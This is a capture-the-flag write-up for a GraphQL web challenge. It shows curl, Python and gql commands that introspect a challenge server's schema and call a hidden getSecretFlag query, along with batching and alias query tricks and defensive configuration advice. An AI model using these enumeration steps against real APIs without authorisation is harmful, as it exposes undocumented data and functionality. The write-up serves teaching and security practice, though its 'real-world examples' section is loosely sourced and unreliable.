# GraphQL - Web Security Challenge Writeup

## Challenge Information
- **Category:** Web
- **Points:** 300
- **Difficulty:** Medium

## Challenge Description
Explore a powerful GraphQL search functionality to discover hidden data. This challenge involves exploiting GraphQL introspection to discover undocumented API endpoints and retrieve a secret flag. The application appears to be a simple product search interface, but GraphQL's introspection feature reveals much more.

## Tools Required
- **curl** - Command-line HTTP client
- **Web Browser** - For initial reconnaissance
- **Burp Suite** or **OWASP ZAP** (optional) - For intercepting requests
- **GraphQL Voyager** (optional) - For visualizing the schema
- **Postman** or **Insomnia** (optional) - API testing tools with GraphQL support

## Challenge URL
`https://yfgrkspxvh-ctf.cybersecuritychallenge.al/`

## Challenge Files
- `Readme.md` - Challenge description and solution
- `image.png` - Screenshot of the web interface
- `Untitled-1.json` - Full GraphQL schema introspection result

## Methodology

### Step 1: Initial Reconnaissance
Visit the challenge URL and explore the interface:

```bash
curl https://yfgrkspxvh-ctf.cybersecuritychallenge.al/
```

The page shows a product search interface with GraphQL functionality.

### Step 2: Analyze the Client-Side Code
View the page source or use browser developer tools:

```html
<script>
  async function searchProducts() {
    const keyword = document.getElementById("searchInput").value;
    const query = `
      query {
        searchProducts(keyword: "${keyword}") {
          id
          name
          price
        }
      }
    `;

    const response = await fetch("/graphql", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query }),
    });

    const result = await response.json();
    const resultsList = document.getElementById("results");
    resultsList.innerHTML = "";

    if (result.data && result.data.searchProducts.length > 0) {
      result.data.searchProducts.forEach(product => {
        const li = document.createElement("li");
        li.textContent = `${product.name} - $${product.price}`;
        resultsList.appendChild(li);
      });
    } else {
      resultsList.innerHTML = "<li>No results found.</li>";
    }
  }
</script>
```

**Key Observations:**
- GraphQL endpoint: `/graphql`
- Query function: `searchProducts(keyword: String)`
- Exposed fields: `id`, `name`, `price`
- No authentication required

### Step 3: Understand GraphQL Introspection
GraphQL has a powerful feature called **introspection** that allows clients to query the schema itself. This reveals:
- All available types
- All available queries and mutations
- Field names and arguments
- Hidden or undocumented endpoints

### Step 4: Perform Schema Introspection
Use the introspection query to discover the full API schema:

```bash
curl -X POST "https://yfgrkspxvh-ctf.cybersecuritychallenge.al/graphql" \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

**Simplified introspection query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

### Step 5: Analyze the Introspection Results
The response reveals all available types and fields:

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Product",
          "fields": [
            { "name": "id" },
            { "name": "name" },
            { "name": "price" }
          ]
        },
        {
          "name": "Query",
          "fields": [
            { "name": "searchProducts" },
            { "name": "getSecretFlag" }
          ]
        }
      ]
    }
  }
}
```

**Critical Discovery:** The `Query` type has TWO fields:
1. `searchProducts` - Documented and visible in the UI
2. `getSecretFlag` - **Hidden endpoint not shown in the interface!**

### Step 6: Query the Hidden Endpoint
Now that we've discovered `getSecretFlag`, let's call it:

```bash
curl -X POST "https://yfgrkspxvh-ctf.cybersecuritychallenge.al/graphql" \
     -H "Content-Type: application/json" \
     -d '{"query":"{ getSecretFlag }"}'
```

**Alternative with jq for pretty output:**
```bash
curl -s -X POST "https://yfgrkspxvh-ctf.cybersecuritychallenge.al/graphql" \
     -H "Content-Type: application/json" \
     -d '{"query":"{ getSecretFlag }"}' | jq
```

### Step 7: Extract the Flag
The response contains the flag:

```json
{
  "data": {
    "getSecretFlag": "CSC25{h1dd3n_gr4phq1_fl4g}"
  }
}
```

**Flag:** `CSC25{h1dd3n_gr4phq1_fl4g}`

## Solution

### Complete Attack Chain
1. **Reconnaissance**: Identify GraphQL endpoint
2. **Source Analysis**: Understand the exposed query
3. **Introspection**: Use `__schema` to discover hidden endpoints
4. **Enumeration**: Identify the `getSecretFlag` query
5. **Exploitation**: Call the hidden endpoint
6. **Flag Extraction**: Retrieve the secret flag

### GraphQL Introspection Vulnerability
- **Enabled by Default**: GraphQL introspection is often left enabled
- **Information Disclosure**: Reveals all available queries and mutations
- **Hidden Endpoints**: Exposes undocumented API functionality
- **Attack Surface**: Helps attackers understand the full API structure

**Flag:** `CSC25{h1dd3n_gr4phq1_fl4g}`

## Key Takeaways

1. **GraphQL Introspection** - Powerful feature that can expose hidden endpoints
2. **Security by Obscurity Fails** - Hiding endpoints doesn't secure them
3. **API Discovery** - Always enumerate all available functionality
4. **Defense in Depth** - Introspection should be disabled in production
5. **Access Control** - All endpoints need proper authentication and authorization

## Security Recommendations

### For Developers:

#### Disable Introspection in Production
```javascript
// Apollo Server example
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
  playground: process.env.NODE_ENV !== 'production',
});
```

```python
# GraphQL-Python example
schema = graphene.Schema(
    query=Query,
    auto_camelcase=False
)

# In production, use middleware to block introspection
```

#### Implement Proper Authentication
```javascript
const resolvers = {
  Query: {
    getSecretFlag: (parent, args, context) => {
      // Verify authentication
      if (!context.user || !context.user.isAdmin) {
        throw new Error('Unauthorized');
      }
      return getFlag();
    }
  }
};
```

#### Use Field-Level Authorization
```javascript
// graphql-shield example
const permissions = shield({
  Query: {
    getSecretFlag: isAuthenticated,
    adminData: isAdmin,
  }
});
```

#### Rate Limiting and Query Complexity
```javascript
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  validationRules: [
    depthLimit(10),
    createComplexityLimitRule(1000)
  ]
});
```

### For Security Professionals:

#### Testing Checklist
- [ ] Check if introspection is enabled
- [ ] Enumerate all queries and mutations
- [ ] Test authentication on all endpoints
- [ ] Verify authorization for sensitive operations
- [ ] Check for query depth/complexity limits
- [ ] Test for injection vulnerabilities
- [ ] Examine error messages for information disclosure

#### Common GraphQL Vulnerabilities
1. **Introspection Enabled** - Reveals API structure
2. **No Authentication** - Unprotected endpoints
3. **Insufficient Authorization** - Missing field-level permissions
4. **Batching Attacks** - Multiple queries in one request
5. **Query Complexity** - Resource exhaustion attacks
6. **Injection** - SQL, NoSQL, or command injection

### For Organizations:

#### Security Best Practices
- Disable introspection in production environments
- Implement comprehensive authentication and authorization
- Use query complexity analysis and rate limiting
- Monitor GraphQL queries for suspicious patterns
- Implement comprehensive logging and alerting
- Regular security audits of GraphQL APIs
- Use security-focused GraphQL middleware

## Educational Value

This challenge teaches:
- **GraphQL Fundamentals** - Understanding schema and queries
- **API Enumeration** - Discovering hidden endpoints
- **Introspection Attacks** - Exploiting misconfigured GraphQL
- **Web Security** - Importance of proper access control
- **OWASP API Security** - API3:2023 - Broken Object Property Level Authorization

## Alternative Tools and Techniques

### Using GraphQL Playground
```
# Visit in browser:
https://yfgrkspxvh-ctf.cybersecuritychallenge.al/graphql

# Enable introspection in Playground
# Use the Schema tab to explore
```

### Using Burp Suite
1. Intercept the `searchProducts` request
2. Send to Repeater
3. Modify query to use introspection
4. Analyze response for hidden endpoints
5. Call discovered endpoints

### Using GraphQL Voyager
```bash
# Install
npm install -g graphql-voyager

# Visualize schema
graphql-voyager --schema schema.json
```

### Using InQL Scanner (Burp Extension)
1. Install InQL from BApp Store
2. Send GraphQL request to InQL
3. Automatically introspect and discover endpoints
4. Generate queries for all discovered endpoints

### Python Script
```python
import requests
import json

url = "https://yfgrkspxvh-ctf.cybersecuritychallenge.al/graphql"

# Introspection query
introspection = {
    "query": """
    {
      __schema {
        queryType {
          fields {
            name
            description
          }
        }
      }
    }
    """
}

response = requests.post(url, json=introspection)
print(json.dumps(response.json(), indent=2))

# Call discovered endpoint
flag_query = {"query": "{ getSecretFlag }"}
response = requests.post(url, json=flag_query)
print(response.json()['data']['getSecretFlag'])
```

### Using gql (GraphQL Client)
```python
from gql import gql, Client
from gql.transport.requests import RequestsHTTPTransport

transport = RequestsHTTPTransport(
    url='https://yfgrkspxvh-ctf.cybersecuritychallenge.al/graphql'
)
client = Client(transport=transport, fetch_schema_from_transport=True)

query = gql('{ getSecretFlag }')
result = client.execute(query)
print(result['getSecretFlag'])
```

## Common Pitfalls

1. **Missing Headers** - Not setting `Content-Type: application/json`
2. **Query Syntax** - Incorrect GraphQL query formatting
3. **Endpoint Path** - Using wrong URL (e.g., `/api/graphql` vs `/graphql`)
4. **JSON Escaping** - Improperly escaped quotes in curl commands
5. **Schema Depth** - Not exploring nested types in introspection results

## Advanced Techniques

### Full Introspection Query
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
  }
}
```

### Batch Query Attack
```json
{
  "query": "[{ getSecretFlag } { getSecretFlag } { getSecretFlag }]"
}
```

### Query Aliases for Multiple Calls
```graphql
{
  flag1: getSecretFlag
  flag2: getSecretFlag
  flag3: getSecretFlag
}
```

## Resources

- [GraphQL Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL Introspection Queries](https://graphql.org/learn/introspection/)
- [Awesome GraphQL Security](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [GraphQL Attack Surface](https://www.apollographql.com/blog/graphql/security/)

## Real-World Examples

### GitHub API (2013)
- Introspection enabled on public API
- Allowed enumeration of all available data
- Used for legitimate documentation

### Facebook GraphQL
- Implemented fine-grained permissions
- Disabled introspection for external users
- Rate limiting and query complexity analysis

### Shopify API
- Introspection available for authenticated users
- Comprehensive field-level authorization
- Query cost analysis to prevent abuse

## Defensive Measures

### Production Configuration
```javascript
// Apollo Server
const server = new ApolloServer({
  introspection: false,
  playground: false,
  plugins: [
    ApolloServerPluginLandingPageDisabled()
  ]
});
```

### Security Headers
```javascript
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  next();
});
```

### Query Whitelisting
```javascript
const allowedQueries = ['searchProducts', 'getProduct'];

const validateQuery = (query) => {
  const queryName = extractQueryName(query);
  if (!allowedQueries.includes(queryName)) {
    throw new Error('Query not allowed');
  }
};
```

## Challenge Variations

Similar challenges might include:
- **Authentication Bypass** - Exploiting weak JWT validation
- **Mutation Abuse** - Unauthorized data modification
- **Nested Queries** - Resource exhaustion attacks
- **Subscription Abuse** - WebSocket-based attacks
- **Alias Overloading** - Bypassing rate limits

## Conclusion

This challenge demonstrates a fundamental security issue in GraphQL implementations: **leaving introspection enabled exposes the entire API structure**. While introspection is useful for development, it should always be disabled in production environments, especially when combined with inadequate access controls.

The key lesson is that **security through obscurity doesn't work** - hidden endpoints must still have proper authentication and authorization, regardless of whether they're documented or discoverable through introspection.
